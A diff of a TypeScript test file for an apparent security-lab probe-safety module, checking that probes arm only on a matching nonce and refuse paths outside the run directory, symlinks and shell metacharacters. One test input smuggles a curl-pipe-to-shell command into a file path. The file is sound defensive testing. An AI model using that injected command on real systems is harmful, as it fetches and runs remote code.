@@ -13,7 +13,7 @@ import * as path from 'node:path';
 import { createRequire } from 'node:module';
 
 const require_ = createRequire(import.meta.url);
-const safety = require_('./rogue-extension/probe-safety.js');
+const safety = require_('./probe-safety.js');
 
 let failures = 0;
 function test(name: string, fn: () => void): void {
@@ -35,32 +35,58 @@ fs.writeFileSync(canary, 'CANARY\n');
 
 test('unarmed without a nonce', () => {
 	delete process.env.SECLAB_PROBE_NONCE;
-	const ctx = safety.context({ rundir: runDir, marker, canary });
-	assert.equal(ctx.armed, false);
+	process.env.SECLAB_PROBE_RUNDIR = runDir;
+	assert.equal(safety.context().armed, false);
+});
+
+test('unarmed when the run directory comes only from the workspace', () => {
+	process.env.SECLAB_PROBE_NONCE = 'abc123';
+	delete process.env.SECLAB_PROBE_RUNDIR;
+	// A hostile workspace supplying its own rundir must not arm anything.
+	assert.equal(safety.context().armed, false);
 });
 
 test('unarmed when the env nonce has no file on disk', () => {
 	process.env.SECLAB_PROBE_NONCE = 'abc123';
 	process.env.SECLAB_PROBE_RUNDIR = runDir;
-	const ctx = safety.context({ rundir: runDir, marker, canary });
-	assert.equal(ctx.armed, false, 'env alone must not arm the probes');
+	assert.equal(safety.context().armed, false, 'env alone must not arm the probes');
 });
 
 test('unarmed on nonce mismatch', () => {
 	fs.writeFileSync(path.join(runDir, '.seclab-probe-nonce'), 'different');
-	const ctx = safety.context({ rundir: runDir, marker, canary });
-	assert.equal(ctx.armed, false);
+	assert.equal(safety.context().armed, false);
 });
 
 fs.writeFileSync(path.join(runDir, '.seclab-probe-nonce'), 'abc123');
-const ctx = safety.context({ rundir: runDir, marker, canary, beacon: '18099' });
+process.env.SECLAB_PROBE_BEACON_PORT = '18099';
+const ctx = safety.context();
 
 test('armed when env and the run-directory file agree', () => {
 	assert.equal(ctx.armed, true);
 });
 
 test('accepts a path inside the run directory', () => {
-	assert.equal(safety.safePath(ctx, marker, 't'), marker);
+	assert.equal(safety.safePath(ctx, ctx.marker, 't'), ctx.marker);
+});
+
+test('marker is derived from the run directory, not from the workspace', () => {
+	assert.equal(ctx.marker, path.join(fs.realpathSync(runDir), 'PWNED'));
+});
+
+test('refuses a shell metacharacter in a path', () => {
+	assert.throws(() => safety.safePath(ctx, `${ctx.runDir}/a';curl http://x|sh;:'`, 't'),
+		/characters a probe may not use/);
+});
+
+test('refuses a dangling symlink as the final component', () => {
+	const link = path.join(runDir, 'dangling');
+	fs.symlinkSync(path.join(runDir, 'does-not-exist-target'), link);
+	assert.throws(() => safety.safePath(ctx, link, 't'), /is a symlink/);
+});
+
+test('markerCommand cannot be injected through the marker path', () => {
+	const cmd = safety.markerCommand(ctx, '');
+	assert.ok(!/[;|&$`]/.test(cmd), cmd);
 });
 
 for (const bad of [
@@ -75,19 +101,17 @@ for (const bad of [
 }
 
 test('refuses a path outside the run directory', () => {
-	assert.throws(() => safety.safePath(ctx, '/usr/local/bin/x', 't'), /outside the run directory/);
+	assert.throws(() => safety.safePath(ctx, '/usr/local/bin/x', 't'), /outside/);
 });
 
 test('refuses traversal out of the run directory', () => {
-	assert.throws(() => safety.safePath(ctx, path.join(runDir, '..', 'escape'), 't'),
-		/outside the run directory/);
+	assert.throws(() => safety.safePath(ctx, path.join(runDir, '..', 'escape'), 't'), /outside/);
 });
 
 test('refuses a symlink pointing out of the run directory', () => {
 	const link = path.join(runDir, 'link-out');
 	fs.symlinkSync('/usr/local', link);
-	assert.throws(() => safety.safePath(ctx, path.join(link, 'bin', 'x'), 't'),
-		/outside the run directory/);
+	assert.throws(() => safety.safePath(ctx, path.join(link, 'bin', 'x'), 't'), /outside/);
 });
 
 test('accepts the local beacon', () => {
@@ -108,7 +132,7 @@ for (const bad of [
 test('markerCommand only ever touches the marker', () => {
 	const cmd = safety.markerCommand(ctx, '.mcp');
 	assert.match(cmd, /^touch '/);
-	assert.ok(cmd.includes(`${marker}.mcp`), cmd);
+	assert.ok(cmd.includes('PWNED.mcp'), cmd);
 	assert.ok(!cmd.includes(';') && !cmd.includes('&&') && !cmd.includes('|'), cmd);
 });
 
